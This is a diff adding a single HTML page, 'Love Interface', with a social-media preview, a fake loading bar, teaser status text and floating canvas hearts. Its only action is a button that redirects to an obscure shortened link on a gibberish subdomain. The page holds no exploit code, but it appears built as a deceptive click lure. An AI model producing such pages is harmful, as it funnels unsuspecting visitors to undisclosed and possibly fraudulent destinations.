@@ -1,0 +1,233 @@
+<!DOCTYPE html>
+<html>
+<head>
+  <title>Love Interface</title>
+
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+
+  <!-- OG PREVIEW -->
+  <meta property="og:title" content="Love Interface • Tap To Enter">
+  <meta property="og:description" content="A soft neon love experience ✨">
+  <meta property="og:image" content="https://i.imgur.com/HsSCtQ0.jpeg">
+
+  <style>
+    * {
+      margin: 0;
+      padding: 0;
+      box-sizing: border-box;
+      font-family: Arial, sans-serif;
+    }
+
+    body {
+      height: 100vh;
+      overflow: hidden;
+      background: #0a0614;
+      display: flex;
+      justify-content: center;
+      align-items: center;
+      color: white;
+    }
+
+    /* BACKGROUND GLOW */
+    .bg {
+      position: fixed;
+      width: 200%;
+      height: 200%;
+      background:
+        radial-gradient(circle at 20% 30%, #ff4fd833, transparent 40%),
+        radial-gradient(circle at 80% 70%, #7a5cff33, transparent 45%),
+        radial-gradient(circle at 50% 50%, #ff7ac633, transparent 50%);
+      filter: blur(70px);
+      animation: move 10s infinite alternate;
+      z-index: 0;
+    }
+
+    @keyframes move {
+      0% { transform: translate(-5%, -5%); }
+      100% { transform: translate(5%, 5%); }
+    }
+
+    #heartCanvas {
+      position: fixed;
+      width: 100%;
+      height: 100%;
+      pointer-events: none;
+      z-index: 1;
+    }
+
+    /* CARD */
+    .card {
+      width: 320px;
+      padding: 28px;
+      border-radius: 18px;
+      background: rgba(255,255,255,0.06);
+      border: 1px solid rgba(255, 105, 180, 0.25);
+      backdrop-filter: blur(16px);
+      text-align: center;
+      z-index: 2;
+    }
+
+    .logo {
+      width: 70px;
+      height: 70px;
+      margin: 0 auto 15px;
+      border-radius: 16px;
+      background: url('https://i.imgur.com/HsSCtQ0.jpeg') center/cover;
+      box-shadow: 0 0 25px #ff4fd866;
+    }
+
+    h1 {
+      font-size: 20px;
+      margin-bottom: 6px;
+    }
+
+    p {
+      font-size: 13px;
+      opacity: 0.7;
+      margin-bottom: 18px;
+    }
+
+    .status {
+      font-size: 12px;
+      color: #ff7ac6;
+      margin-bottom: 12px;
+    }
+
+    .bar {
+      width: 100%;
+      height: 6px;
+      background: rgba(255,255,255,0.08);
+      border-radius: 10px;
+      overflow: hidden;
+      margin-bottom: 18px;
+    }
+
+    .fill {
+      height: 100%;
+      width: 0%;
+      background: linear-gradient(90deg, #ff4fd8, #7a5cff);
+      transition: width 0.2s;
+    }
+
+    button {
+      width: 100%;
+      padding: 12px;
+      border-radius: 14px;
+      border: 1px solid #ff4fd855;
+      background: transparent;
+      color: #ff7ac6;
+      font-weight: bold;
+      cursor: pointer;
+    }
+
+    button:hover {
+      background: rgba(255,79,216,0.12);
+    }
+  </style>
+</head>
+
+<body>
+
+<div class="bg"></div>
+<canvas id="heartCanvas"></canvas>
+
+<div class="card">
+  <div class="logo"></div>
+
+  <h1>Love Interface</h1>
+  <p>Soft neon visual experience</p>
+
+  <div class="status" id="status">Loading...</div>
+
+  <div class="bar">
+    <div class="fill" id="fill"></div>
+  </div>
+
+  <button onclick="go()">Enter Experience</button>
+</div>
+
+<script>
+  const link = "https://dffjhfg.lnkks.com/p/oRqSU";
+
+  function go() {
+    window.location.href = link;
+  }
+
+  // loading bar
+  let progress = 0;
+  const fill = document.getElementById("fill");
+
+  setInterval(() => {
+    if (progress < 100) {
+      progress += Math.random() * 8;
+      if (progress > 100) progress = 100;
+      fill.style.width = progress + "%";
+    }
+  }, 120);
+
+  const texts = ["Loading love...", "Preparing interface...", "Ready ✨"];
+  let i = 0;
+
+  setInterval(() => {
+    document.getElementById("status").innerText = texts[i];
+    i = (i + 1) % texts.length;
+  }, 900);
+
+  // hearts
+  const canvas = document.getElementById("heartCanvas");
+  const ctx = canvas.getContext("2d");
+
+  canvas.width = innerWidth;
+  canvas.height = innerHeight;
+
+  window.addEventListener("resize", () => {
+    canvas.width = innerWidth;
+    canvas.height = innerHeight;
+  });
+
+  const hearts = [];
+
+  function create() {
+    return {
+      x: Math.random() * canvas.width,
+      y: canvas.height + 10,
+      size: Math.random() * 8 + 5,
+      speed: Math.random() * 1.5 + 0.5,
+      drift: Math.random() - 0.5
+    };
+  }
+
+  setInterval(() => {
+    if (hearts.length < 30) hearts.push(create());
+  }, 150);
+
+  function draw(x, y, s) {
+    ctx.fillStyle = "#ff4fd8";
+    ctx.beginPath();
+    ctx.moveTo(x, y);
+    ctx.bezierCurveTo(x, y - s, x - s, y - s, x - s, y);
+    ctx.bezierCurveTo(x - s, y + s, x, y + s, x, y + s*1.2);
+    ctx.bezierCurveTo(x, y + s, x + s, y + s, x + s, y);
+    ctx.bezierCurveTo(x + s, y - s, x, y - s, x, y);
+    ctx.fill();
+  }
+
+  function animate() {
+    ctx.clearRect(0, 0, canvas.width, canvas.height);
+
+    hearts.forEach((h, idx) => {
+      h.y -= h.speed;
+      h.x += h.drift;
+      draw(h.x, h.y, h.size);
+
+      if (h.y < -20) hearts[idx] = create();
+    });
+
+    requestAnimationFrame(animate);
+  }
+
+  animate();
+</script>
+
+</body>
+</html>
